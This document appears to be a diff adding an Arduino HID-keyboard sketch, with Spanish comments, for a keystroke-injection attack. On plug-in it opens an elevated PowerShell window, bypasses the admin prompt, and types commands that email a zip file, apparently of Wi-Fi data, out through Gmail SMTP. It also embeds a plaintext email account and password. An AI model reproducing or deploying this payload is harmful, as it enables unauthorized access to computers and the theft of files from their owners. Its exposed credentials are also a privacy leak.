@@ -1,0 +1,79 @@
+#include "HID-Project.h"
+void setup() {
+  // put your setup code here, to run once:
+  Keyboard.begin();
+  delay(500);
+
+  //Abrir Ejecutar
+  Keyboard.press(KEY_LEFT_GUI);
+  Keyboard.press(KEY_R);
+  Keyboard.releaseAll();
+  delay(500);
+  Keyboard.print("powershell");
+  delay(500);
+  Keyboard.press(KEY_LEFT_CTRL);
+  Keyboard.press(KEY_LEFT_SHIFT);
+  Keyboard.press(KEY_ENTER);
+  Keyboard.releaseAll();
+  delay(2000);
+
+  //Ejecutar el pop up
+  Keyboard.press(KEY_LEFT_ARROW);
+  Keyboard.releaseAll();
+  delay(500);
+  Keyboard.press(KEY_ENTER);
+  Keyboard.releaseAll();
+  delay(1000);
+
+  //Enviar mail con adjunto
+  //Linea1
+  Keyboard.println("$Archivo)-C>&WiFieee.zip-");
+  //Linea2
+  Keyboard.println("$Mensaje)New/Object System.Net.Mail.MailMessage");
+  //Linea3
+  Keyboard.print("$Mensaje.From)-jgparrales");
+  Keyboard.press(KEY_RIGHT_ALT);
+  Keyboard.press(KEY_Q);
+  Keyboard.releaseAll();
+  Keyboard.println("tes.edu.ec-");
+  //Linea4
+  Keyboard.print("$Mensaje.To.Add*-jgparrales");
+  Keyboard.press(KEY_RIGHT_ALT);
+  Keyboard.press(KEY_Q);
+  Keyboard.releaseAll();
+  Keyboard.println("tes.edu.ec-(");
+  //Linea5
+  Keyboard.println("$Mensaje.IsBodyHtml)$True");
+  //Linea6
+  Keyboard.println("$Mensaje.Subject)-prueba-");
+  //Linea7
+  Keyboard.println("$Mensaje.Body)-esto es una prueba-");
+  //Linea8
+  Keyboard.println("$Adjunto)New/Object Net.Mail.Attachment*$Archivo(");
+   //Linea9
+  Keyboard.println("$Mensaje.Attachments.Add*$Adjunto(");
+   //Linea10
+  Keyboard.println("$ClienteSMTP)New/Object Net.Mail.SmtpClient*-smtp.gmail.com-, 587(");
+   //Linea11
+  Keyboard.println("$ClienteSMTP.EnableSsl)$true");
+   //Linea12
+  Keyboard.print("$ClienteSMTP.Credentials)New/Object System.Net.NetworkCredential*-jgparrales");
+  Keyboard.press(KEY_RIGHT_ALT);
+  Keyboard.press(KEY_Q);
+  Keyboard.releaseAll();
+  Keyboard.print("tes.edu.ec-,-J0s3");
+  Keyboard.press(KEY_RIGHT_ALT);
+  Keyboard.press(KEY_Q);
+  Keyboard.releaseAll();
+  Keyboard.println("1027-(");
+   //Linea13
+  Keyboard.println("$ClienteSMTP.Send*$Mensaje(");
+
+
+
+}
+
+void loop() {
+  // put your main code here, to run repeatedly:
+
+}
